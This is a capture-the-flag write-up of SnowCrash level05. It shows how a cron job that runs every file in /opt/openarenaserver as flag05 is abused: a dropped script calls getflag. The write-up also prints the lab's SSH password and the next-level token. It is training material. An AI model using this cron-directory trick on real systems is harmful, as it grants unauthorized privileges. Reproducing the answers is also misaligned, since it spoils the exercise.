# level05

### cron job

### You have new mail.

```
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
           _____                      _____               _     
          / ____|                    / ____|             | |    
         | (___  _ __   _____      _| |     _ __ __ _ ___| |__  
          \___ \| '_ \ / _ \ \ /\ / / |    | '__/ _` / __| '_ \ 
          ____) | | | | (_) \ V  V /| |____| | | (_| \__ \ | | |
         |_____/|_| |_|\___/ \_/\_/  \_____|_|  \__,_|___/_| |_|
                                                        
  Good luck & Have fun

          192.168.1.50

level05@192.168.1.50's 
password: ne2searoevaevoem4ov4ar8ap
You have new mail.
```
One big tip right at the beginning:

The `mail` directory is not located in the same place on all Linux distributions.

To find it, I used:

```bash
find / -type d -name mail 2>/dev/null
```

Explanation:

* `/` → starts searching from the root directory
* `-type d` → searches only for directories
* `-name mail` → searches for the exact name `mail`
* `2>/dev/null` → redirects permission errors and other error messages to `/dev/null`

### Finding the mail directory

Using `ls`, I checked the mail directory:

```bash
level05@SnowCrash:~$ ls -l /var/mail/
total 4
-rw-r--r--+ 1 root mail 58 Aug  2 16:02 level05
```

The mail file belongs to `level05`, so I read it:

```bash
level05@SnowCrash:~$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

This reveals a cron job running every 2 minutes.

The command:

```bash
su -c "sh /usr/sbin/openarenaserver" - flag05
```

means that `/usr/sbin/openarenaserver` is executed as the user `flag05`.

---

### Inspecting the script

I checked the script:

```bash
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```

The script executes every file **placed inside:**

```bash
/opt/openarenaserver/
```

with the privileges of user `flag05`, and then deletes the file.

This means I can create a script inside this directory, and it will be executed by `flag05` during the next cron execution.


I tested by creating a simple test file inside `/var/` and `/opt/openarenaserver/` to verify if the cron job was executing my files.

The test worked, which confirmed that files placed in `/opt/openarenaserver/` were executed automatically by the script running as `flag05`.

After confirming the execution, I created a script that calls `getflag` and redirects the output to a file:

```bash
#!/bin/sh
getflag > /tmp/token05
```

When the cron job executed the script, it ran with `flag05` privileges, allowing me to retrieve the token.

I have a maximum of 2 minutes to retrieve the token because the cron job runs every 2 minutes and deletes the executed files afterwards.

### the flag

```
-rwxrwxr-x+ 1 level05 level05 33 Aug  2 22:35 exploit.sh
level05@SnowCrash:~$ cat /tmp/token05
Check flag.Here is your token : viuaaale9huek52boumoomioc

```
---
### Next Password for ssh level06@192.168.1.50 -p 4242

### viuaaale9huek52boumoomioc
---


